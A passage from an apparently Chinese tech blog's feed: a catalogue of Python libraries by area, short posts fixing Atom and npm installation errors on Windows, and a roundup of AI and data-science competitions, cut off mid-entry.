python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。</p><p>Cytoolz，python 加速库SWIG，简化封装和接口生成器。</p><p>Cython，Python优化静态编译器。</p><p>PyPy，Python解释器的 Python实现。</p><p>Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。</p><p>pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。</p><p>ino，Arduino命令行工具。</p><p>Pyro，Python的机器人工具包。</p><p>pluginbase，一个简单而灵活的Python的插件系统。</p><p>itsdangerous，数据安全传输工具。</p><p>blinker，快速Python中的信号/事件调度系统。</p><p>pychievements，用于创建和跟踪成果框架。</p><p>python-patterns，Python中的设计模式。</p><p>pefileWindows PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。</p><p>数据库</p><p>库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。</p><p>pickledb,简单和轻量级的K-V键值存储。</p><p>TinyDB, 轻量级，面向文档的数据库。</p><p>mysql-python，MySQL的Python工具库。</p><p>mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。</p><p>mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。</p><p>oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。</p><p>psycopg2，最流行的Python PostgreSQL适配器。</p><p>txpostgres，于Twisted的异步驱动，用于PostgreSQL。</p><p>queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。</p><p>cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。</p><p>HappyBase，友好的Apache [Hbase]的函数库。</p><p>PyMongo，MongoDB官方客户端。</p><p>Plyvel，LevelDB快速和功能丰富的Python接口。</p><p>redis-py,redis客户端。</p><p>py2neo,Python客户端(基于Neo4j的RESTful接口).</p><p>telephus,基于Twisted的cassandra客户端。</p><p>txRedis，基于Twisted的Redis客户端。</p><p>在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！</p><p>【网络】</p><p>Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。</p><p>Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。</p><p>httpie，命令行HTTP客户端，用户友好的cURL的替换工具。</p><p>s3cmd，命令行工具，用于管理Amazon S3和CloudFront。</p><p>youtube-dl，命令行程序，从YouTube下载视频。</p><p>you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。</p><p>subliminal，命令行工具，搜索和下载字幕的函数库。</p><p>requests，HTTP函数库，更加人性化。</p><p>grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。</p><p>urllib3，一个线程安全的HTTP连接池，支持文件post。</p><p>httplib2，综合HTTP的客户端函数库。</p><p>treq， Python API接口，Twisted的HTTP客户。</p><p>Mininet，流行的网络仿真器,API采用python编写。</p><p>POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。</p><p>Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。</p><p>SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。</p><p>inbox.py，Python的SMTP服务器。</p><p>imbox， Python版本IMAP库。</p><p>inbox，收件箱，开源邮件工具包。</p><p>lamson,SMTP服务器。</p><p>flanker,侧卫,电子邮件地址和MIME解析库。</p><p>marrow.mailer,高性能可扩展邮件交付框架。</p><p>django-celery-ses， Django电子邮件后台，使用AWS SES和Celery。</p><p>modoboa，邮件托管和管理平台，包括现代和简化Web UI。</p><p>envelopes，邮件工具。</p><p>mailjet，批量邮寄mailjet API接口，带统计。</p><p>Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。</p><p>furl，燃料，小型的的URL解析库库。</p><p>purl，简单的，干净的API，操纵URL。</p><p>pyshorteners，纯Python库，URL短网址编辑。</p><p>short_url，短网址生成。</p><p>Scrapy，快速屏幕截取和网页抓取的框架。</p><p>portia，波西亚，Scrapy的可视化扩展。</p><p>feedparser，信息源解释器</p><p>RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。</p><p>MechanicalSoup，网站自动化互动测试工具包。</p><p>mechanize，网页浏览编程工具。</p><p>Demiurge，造物主，-PyQuery的轻量级工具。</p><p>newspaper,提取报纸新闻。</p><p>html2text,转换HTML为 Markdown格式的文本。</p><p>python-goose,HTML内容提取器。</p><p>lassie,莱西,人性化的网站内容检索。</p><p>micawber,通过UR抓提网页的函数库。</p><p>sumy，概要，文本和HTML网页的自动文摘模块。</p><p>Haul，距离，可扩展的图像爬虫。</p><p>python-readability,可读性工具Arc90,快速的Python接口。</p><p>opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。</p><p>sanitize，消毒，使混乱的数据变的理智。</p><p>AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。</p><p>SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。</p><p>zeroRPC，基于ZeroMQ和MessagePack的RPC实现。</p><p>apache-libcloud，所有云服务的Python接口库。</p><p>wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。</p><p>streamparse，运行Python代码和数据的实时流。集成了Apache Storm。</p><p>boto，亚马逊网络服务接口。</p><p>twython，Twitter推特API。</p><p>google-api-python-client，谷歌客户端API。</p><p>gspread，谷歌电子表格的Python API。</p><p>facebook-sdk，facebook平台Python SDK。</p><p>facepy，简易的facebook图形APIgmail，Gmail的Python接口。</p><p>django-wordpress，Django的WordPress的模型和视图。</p><p>Web框架</p><p>Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库</p><p>PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。</p><p>Pylons 基于Python的一个极其高效和可靠的Web开发框架</p><p>Zope 开源的Web应用服务器</p><p>TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。</p><p>QuixoteWeb开发框架Flask,轻量级web框架。</p><p>Bottle，快速，简单和轻量级的WSGI模式Web框架。</p><p>Pyramid，轻量级，快速，稳定的开源Web框架。</p><p>web2py，简单易用的全堆栈Web框架和平台。</p><p>web.py，强大、简单的Web框架。</p><p>TurboGears，便于扩展的Web框架。</p><p>CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。</p><p>Grok，基于Zope3的Web框架。</p><p>Bluebream，开源的Web应用服务器，原名Zope 3。</p><p>guava，轻量级，高性能的Python-Web框架，采用c语言编写。</p><p>django-cms，基于Django企业级开源CMS。</p><p>djedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。</p><p>FeinCMS，基于Django的先进内容管理系统。</p><p>Kotte，高层次的Python的Web应用框架，基于Pyramid。</p><p>Mezzanine，强大，一致，灵活的内容管理平台。</p><p>Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。</p><p>Plone，基于Zope的开源应用服务器Zope。</p><p>Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。</p><p>Wagtail，Django内容管理系统。</p><p>Widgy，CMS框架，基于Django。</p><p>django-oscar，Django奥斯卡，开源的电子商务框架。</p><p>django-shop，基于Django的网店系统。</p><p>merchant，支持多种付款处理工具。</p><p>money，可扩展的货币兑换解决方案。</p><p>python-currencies，货币显示格式。</p><p>cornice，Pyramid的REST框架。</p><p>django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。</p><p>django-tastypie，创造精美的Django应用程序API接口。</p><p>django-formapi，创建JSON API、HMAC认证和Django表单验证。</p><p>flask-api，提供统一的浏览器体验，基于Django框架。</p><p>flask-restful，快速构建REST API支持扩展。</p><p>flask-api-utils，flask的扩展。</p><p>falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。</p><p>eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。</p><p>sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。</p><p>restless，类似TastyPie的框架。</p><p>savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。</p><p>Genshi，网络感知输出模板工具包。</p><p>Mako，马可，Python平台的超高速、轻型模板。</p><p>Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。</p><p>Spitfire，快速的Python编译模板。</p><p>django-haystack,大海捞针,Django模块搜索。</p><p>elasticsearch-py,Elasticsearch官方低级的Python客户端。</p><p>solrpy,solr客户端。</p><p>Whoosh,呼,快速，纯Python搜索引擎库。</p><p>Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。</p><p>django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。</p><p>Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。</p><p>dogpile.cache，是Beaker作者的下一代替代作品。</p><p>HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。</p><p>django-cache-machine，Django缓存机，自动缓存失效，使用ORM。</p><p>django-cacheops，自动颗粒事件驱动，ORM缓存失效。</p><p>johnny-cache,约翰尼高速缓存框架,Django应用程序。</p><p>django-viewlet,渲染模板部件扩展缓存控制。</p><p>pylibmc,在libmemcached接口。</p><p>WTForms-JSON,JSON表单数据处理扩展。</p><p>Deform， HTML表单生成的函数库。</p><p>django-bootstrap3，bootstrap3，集成了Django。</p><p>django-crispy-forms，Django程序，可以创建优雅的表单。</p><p>django-remote-forms，Django的远程表单，Django表格的序列化程序。</p><p>django-simple-spam-blocker，Django简单的垃圾邮件拦截器。</p><p>django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。</p><p>Grappelli，界面花哨的django皮肤。</p><p>django-suit，Django替代o界面（仅用于非商业用途）。</p><p>django-xadmin，Django管理面板替代工具。</p><p>flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。</p><p>Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。</p><p>Cactus,仙人掌,设计师的网站静态生成器。</p><p>Hyde，海德， 基于Jinja2的静态网站生成器。</p><p>Nikola，尼古拉-一个静态网站和博客生成器。</p><p>Tags，标签，最简单的静态网站生成器。</p><p>Tinkerer，工匠，基于Sphinx的静态网站生成器。</p><p>asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。</p><p>gevent，基于Python的网络库。</p><p>Twisted，扭曲，事件驱动的网络引擎。</p><p>Tornado，龙卷风，Web框架和异步网络的函数库。</p><p>pulsar，脉冲星，事件驱动的并行框架的Python。</p><p>diesel，柴油，绿色的，基于事件的I/O框架。</p><p>eventlet，WSGI支持异步框架。</p><p>pyzmq， 0MQ消息库的Python封装。</p><p>txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。</p><p>wsgiref，Python标准库，WSGI封装实现，单线程。</p><p>Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。</p><p>paste，粘贴，多线程，稳定的，久经考验的WSGI工具。</p><p>rocket，火箭，多线程服务，基于Pyramid。</p><p>netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。</p><p>fapws3，异步网络，用C写的。</p><p>meinheld，异步WSGI服务器，是用C写的。</p><p>bjoern，-快速的、异步WSGI服务器，用C写的。</p><p>安全</p><p>Permissions函数库，允许或拒绝用户访问数据或函数。</p><p>django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。</p><p>Authomatic，简单强大的认证/授权客户端。</p><p>OAuthLib， 通用，规范，OAuth请求签约工具。</p><p>rauth，用于OAuth 1.0，2.0，的Python库。</p><p>python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。</p><p>python-social-auth，易于安装的社会认证机制。</p><p>django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。</p><p>django-allauth，Django认证的应用程序。</p><p>Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。</p><p>jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。</p><p>python-jwt，JSON的Web令牌生成和验证模块。</p><p>pyjwt，JSON的Web令牌草案01。</p><p>python-jws，JSON的Web令牌草案02。</p><p>PyCrypto，Python的加密工具包。</p><p>Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。</p><p>cryptography，密码开发工具包。</p><p>PyNac，网络和密码（NaCl）函数库。</p><p>hashids，hashids的 Python函数库。</p><p>Passlib，安全的密码存储/哈希库，非常高的水平。</p><p>hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。</p><p>它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512.</p><p>GUI库</p><p>名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。</p><p>wxPython，混合wxWidgets的C++类库。</p><p>kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。</p><p>curse，用于创建终端GUI应用程序。</p><p>urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。</p><p>pyglet，跨平台的窗口和多媒体库的Python。</p><p>Tkinter，是Python事实上的标准GUI软件包。</p><p>enaml，创建漂亮的用户界面，语法类似QML。</p><p>Toga，托加，OS原生GUI工具包。【构建封装】</p><p>pyenv,简单的Python版本管理。</p><p>virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。</p><p>virtualenvwrapper，是virtualenv的一组扩展。</p><p>pew,一套管理多个虚拟环境的工具。</p><p>vex，使运行指定的virtualenv命令。</p><p>PyRun，一个单文件，无需安装的Python版本管理工具。</p><p>PIP，Python包和依赖的管理工具。</p><p>easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。</p><p>conda，跨平台，二进制软件包管理器。</p><p>Curdling，一个管理Python包的命令行工具。</p><p>wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库</p><p>py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。</p><p>pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。</p><p>pynsist,构建Windows安装程序的工具，用Python编写。</p><p>dh-virtualenv,建立和分发virtualenv(Debian软件包格式)</p><p>PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。</p><p>devpi，PyPI服务器和包装/测试/发布工具。</p><p>localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。</p><p>buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。</p><p>SCons，软件构造工具。</p><p>platformio，一个控制台的工具，构建的代码可用于不同的开发平台。</p><p>bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包</p><p>fabricate，自动为任何编程语言，生成依赖包。</p><p>django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。</p><p>jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。</p><p>webassets，优化管理，静态资源，独特的缓存清除。</p><p>fanstatic，球迷，包优化，提供静态文件。</p><p>fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。</p><p>django-storages，一组自定义存储Django后台。</p><p>glue，胶胶，一个简单的命令行工具，生成CSS Sprites。</p><p>libsass-python，Sass (层叠样式表)的Python接口。</p><p>Flask-Assets，整合应用程序资源。【代码调试】</p><p>unittest，Python标准库，单元测试框架。</p><p>nose，鼻子，unittest延伸产品。</p><p>pytest，成熟的全功能的Python测试工具。</p><p>mamba，曼巴，Python的权威测试工具，出自BDD的旗下。</p><p>contexts，背景，BDD测试框架，基于C#。</p><p>pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。</p><p>splinter，分裂，测试Web应用程序的开源工具。</p><p>locust，刺槐，可扩展的用户负载测试工具，用Python写的。</p><p>sixpack，语言无关的A/B测试框架。</p><p>mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。</p><p>responses，工具函数，用于mock模拟测试。</p><p>doublex-强大的测试框架。</p><p>freezegun，通过时间调整，测试模块。</p><p>httpretty， HTTP请求的模拟工具。</p><p>httmock，mock模拟测试。</p><p>coverage，代码覆盖度量测试。</p><p>faker，生成模拟测试数据的Python包。</p><p>mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。</p><p>ForgeryPy，易用的模拟数据发生器。</p><p>radar，雷达，生成随机日期/时间。</p><p>FuckIt.py，测试Python代码运行。</p><p>Code Analysispysonar2，Python类型索引。</p><p>pycallgraph,可视化的流量（调用图）应用程序。</p><p>code2flow,转换Python和JavaScript代码到流程图。</p><p>LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。</p><p>Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。</p><p>Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。</p><p>pdb,Python标准库,Python调试器。</p><p>ipdb,IPython使用的PDB。</p><p>winpdb，独立于平台的GUI调试器。</p><p>pudb，全屏，基于python调试控制台。</p><p>pyringe，-可附着于及注入代码到Python程序的调试器。</p><p>python-statsd，statsd服务器客户端。</p><p>memory_profiler， 内存监视。</p><p>profiling，交互式Python分析器。</p><p>django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。</p><p>flask-debugtoolbar,flask调试工具。</p>]]></content>
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows 安装 Atom 失败，出现update已停止工作</title>
      <link href="/2019/08-18-atom-error-resolve.html"/>
      <url>/2019/08-18-atom-error-resolve.html</url>
      <content type="html"><![CDATA[<p>我是在最近重装系统后，安装atom时使用.exe安装失败，出现如下错误:<br><img src="/article_img/atom-solution.png" alt="&quot;atom-solution&quot;"></p><p>最后通过换安装方式解决的：我使用的是atom-windows.zip<br>安装包地址如下:<br><a href="https://github.com/atom/atom/releases/tag/v1.40.0" target="_blank" rel="noopener">https://github.com/atom/atom/releases/tag/v1.40.0</a></p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> atom </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>npm ERR! Unexpected end of JSON input while parsing near和npm ERR! code EINTEGRITY</title>
      <link href="/2019/06-29-npm-error-resolve.html"/>
      <url>/2019/06-29-npm-error-resolve.html</url>
      <content type="html"><![CDATA[<p>最近有一段时间没用npm再用的时候发现了不少错误，在使用npm install的时候出现npm ERR! Unexpected end of JSON input while parsing near等等提示，开始用了网上给出了清理cache等方法，比如<a href="https://www.cnblogs.com/gitnull/p/10193382.html" target="_blank" rel="noopener">https://www.cnblogs.com/gitnull/p/10193382.html</a> 给出的，试了挺久发现对我的问题不适用，没解决，在卸掉npm重装之后还是出现这种问题，最后我换了个思路，把配置npm的全局模块的存放路径以及cache的路径给换掉之后解决了此问题，具体是什么原因导致这种问题的我也比较模糊，魔性问题，下面给出我的解决方案。</p><h1 id="配置npm的全局模块的存放路径以及cache的路径"><a href="#配置npm的全局模块的存放路径以及cache的路径" class="headerlink" title="配置npm的全局模块的存放路径以及cache的路径"></a>配置npm的全局模块的存放路径以及cache的路径</h1><p>在cmd中输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;a:/nodejs/node_global&quot;</span><br><span class="line">npm config set cache &quot;a:/nodejs/node_cache&quot;</span><br></pre></td></tr></table></figure><p>tip:如果出现命令找不到的提示说明没加入到环境变量中，把npm安装的目录放到PATH环境中（WINDOWS下）</p><p>上面俩个命令执行成功会在nodejs文件夹中创建两个文件夹，”node_global”及”node_cache” ，这个nodejs文件夹不是固定的，随你自己设定一个目录，路径填正确了，执行之后如下图所示：</p><div align="center">!["npm_error-1"](/article_img/npm_error-1.png)</div><p>接下来就是正常的npm的安装操作了</p><h1 id="设置淘宝镜像"><a href="#设置淘宝镜像" class="headerlink" title="设置淘宝镜像"></a>设置淘宝镜像</h1><p>我自己用的就是这个镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://registry.cnpmjs.org</span><br></pre></td></tr></table></figure><h1 id="安装测试一下"><a href="#安装测试一下" class="headerlink" title="安装测试一下"></a>安装测试一下</h1><p>顺便安装个镜像管理工具，方便之后镜像源更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br></pre></td></tr></table></figure><p>这一步没有出现问题的话就相当于解决了</p><h2 id="展开镜像源"><a href="#展开镜像源" class="headerlink" title="展开镜像源"></a>展开镜像源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nrm ls</span><br></pre></td></tr></table></figure><p>如果出现命令找不到，就把刚刚的a:/nodejs/node_global加到环境变量里面，具体看你自己设的目录</p><p>成功会展示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;nrm ls</span><br><span class="line"></span><br><span class="line">  npm ---- https://registry.npmjs.org/</span><br><span class="line">  cnpm --- http://r.cnpmjs.org/</span><br><span class="line">  taobao - https://registry.npm.taobao.org/</span><br><span class="line">  nj ----- https://registry.nodejitsu.com/</span><br><span class="line">  npmMirror  https://skimdb.npmjs.com/registry/</span><br><span class="line">  edunpm - http://registry.enpmjs.org/</span><br></pre></td></tr></table></figure><p>之后可以利用nrm use 镜像名 设置镜像源</p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>人工智能、大数据相关比赛信息收集</title>
      <link href="/2019/05-04-Artificial-competition.html"/>
      <url>/2019/05-04-Artificial-competition.html</url>
      <content type="html"><![CDATA[<h1 id="国外-overseas"><a href="#国外-overseas" class="headerlink" title="国外 overseas"></a>国外 overseas</h1><h2 id="kaggle数据科学竞赛-Competitions-Kaggle"><a href="#kaggle数据科学竞赛-Competitions-Kaggle" class="headerlink" title="kaggle数据科学竞赛 - Competitions | Kaggle"></a>kaggle数据科学竞赛 - Competitions | Kaggle</h2><p>Kaggle号称是全球最大的数据科学家汇聚的平台，高手云集，同时对萌新也很友好。<br>Kaggle 上有两个最适合新手的竞赛（某种程度上已成为 Kaggle 的「入门教程」）：<br>Titanic（预测生存：一种二元分类问题）：<a href="https://www.kaggle.com/c/titanic" target="_blank" rel="noopener">https://www.kaggle.com/c/titanic</a><br>房价（预测价格：回归问题）：<a href="https://www.kaggle.com/c/house-prices-advanced-regression-techniques" target="_blank" rel="noopener">https://www.kaggle.com/c/house-prices-advanced-regression-techniques</a><br>强烈建议你有时间两项都尝试一下，对入门学习是很有益处的！</p><h1 id="国内（domestic-inland-）"><a href="#国内（domestic-inland-）" class="headerlink" title="国内（domestic inland ）"></a>国内（domestic inland ）</h1><p>国内是看到了AI在未来的重要性，各个公司已经相应投资者纷纷开设了很多相关的比赛及平台，下面说下我所知道的。</p><h2 id="阿里云天池大赛"><a href="#阿里云天池大赛" class="headerlink" title="阿里云天池大赛"></a>阿里云天池大赛</h2><p>2015年3月23日，阿里云计算宣布启动新一赛季的天池大数据竞赛，到目前为止，已经加入了很多，比如算法大赛，程序设计大赛，为新手准备的入门赛，还有可视化大赛，千里马大赛，创新应用大赛。门类相对来说非常齐全。 而且一般比赛持续周期很长，大家可以择机参加。</p><h2 id="DF-CCF指定专业大数据竞赛平台"><a href="#DF-CCF指定专业大数据竞赛平台" class="headerlink" title="DF,CCF指定专业大数据竞赛平台"></a>DF,CCF指定专业大数据竞赛平台</h2><p>DF(DataFountain)的目标是构建中国最有影响力和权威度的数据科学与大数据分析处理竞赛平台。大赛的奖池规模很大，而且备考中国计算机学会这种国家学会，和很多优秀企业开办比赛，平台竞赛数量质量越来越高，CCF每年的大赛都是DF组织的，影响力挺大的，平台参与人数也挺多。</p><h2 id="AI-Challenger-全球AI挑战赛"><a href="#AI-Challenger-全球AI挑战赛" class="headerlink" title="AI Challenger - 全球AI挑战赛"></a>AI Challenger - 全球AI挑战赛</h2><p>“AIChallenger全球AI挑战赛”。是由创新工场、搜狗和今日头条联合宣布三方携手发起的。 AI Challenger 全球AI挑战赛”是面向全球人工智能人才的开源数据集和编程竞赛平台，致力于满足AI人才成长对高质量丰富数据集的需求，推动AI在科研与商业领域结合来解决真实世界的问题。 2017年才举办第一期，现在2018年8月第二期开始啦。 这个比赛数据集很大，都是解决实际问题，难度较高，当然，奖金特别高，一般都是公司或者高校团队参加。</p><h2 id="FlyAI-AI竞赛服务平台"><a href="#FlyAI-AI竞赛服务平台" class="headerlink" title="FlyAI-AI竞赛服务平台"></a>FlyAI-AI竞赛服务平台</h2><p>新发现的一个AI竞赛平台，比赛类型分为图像，自然语言处理，语音这三块，比赛形式每提交一次代码只要符合条件就有奖金。个人觉得这种形式还是挺好的，真的有助于全民AI的氛围形成。 FlyAI 新一代AI竞赛社区 FlyAI是游戏化AI竞赛服务平台，吸引国内外优秀的AI开发者和AI需求者，让AI从科学家社区走向工程师社区。它不仅仅是开发者社区，而是未来企业个性化AI解决方案的核心，也是未来AI行业生态的起点。目前平台已注册3000人，拥有近50个AI项目（可执行代码、规范化数据、可用模型），接下来将会通过技术论坛、资讯网站、校园等途径不断发掘吸引AI人才。</p><h2 id="数据竞赛平台-biendata"><a href="#数据竞赛平台-biendata" class="headerlink" title="数据竞赛平台 - biendata"></a>数据竞赛平台 - biendata</h2><p>Biendata.com是一个人工智能竞赛学习平台。用户可通过该平台报名并参加人工智能领域各类赛事。 这项比赛奖金也是很丰厚的，不过也是难度较高，一般公司或者高校团队参加。 最近有一个比赛是： 中国人工智能学会 &amp; 字节跳动 办的为字节跳动海外产品文章自动生成标题，感觉还是挺有意思的。</p><h2 id="科赛-Kesci-com"><a href="#科赛-Kesci-com" class="headerlink" title="科赛- Kesci.com"></a>科赛- Kesci.com</h2><p>科赛(Kesci.com)是聚合数据人才和行业问题的在线社区。科赛打造的 K-Lab 在线数据分析协作平台,为数据工作者的学习和工作带来全新的体验。 比赛有简单，有难，有些有奖金，有些没有，可能知名度没有前几个高</p><h2 id="数愿大数据AI竞赛平台"><a href="#数愿大数据AI竞赛平台" class="headerlink" title="数愿大数据AI竞赛平台"></a>数愿大数据AI竞赛平台</h2><p>致力于打造一流高度专业化大数据人工智能竞赛,挖掘优质人才和数据价值,推动项目商业化落地,助力创业者实现梦想 奖励丰厚，大多和创业相关，知名度不高，不过价值很高，可以多多参与。</p><h2 id="关注智能生活的黑客大赛GeekPwn"><a href="#关注智能生活的黑客大赛GeekPwn" class="headerlink" title="关注智能生活的黑客大赛GeekPwn"></a>关注智能生活的黑客大赛GeekPwn</h2><p>大赛主要聚焦人工智能安全问题<br>聚焦机器学习对抗训练 全球首创AI对抗样本攻防赛CAAD CTF CAAD对抗样本攻防赛是GeekPwn2018推出的全新挑战项目，聚焦人工智能领域潜在安全问题，旨在通过专业的技术比拼，选手在现场进行实时攻击与防守比赛，提前预演人工智能应用潜在的安全风险，保护人工智能健康成长。<br>GeekPwn2018嘉年华将于2018 年10月24日-25日在上海举行。届时CAAD 对抗样本攻防赛、数据追踪挑战赛、黑客屋挑战赛、机器特工挑战赛、PWN FOR FUN趣味挑战赛、基于漏洞和非基于漏洞挑战赛轮番上演</p><h1 id="其他公司比赛"><a href="#其他公司比赛" class="headerlink" 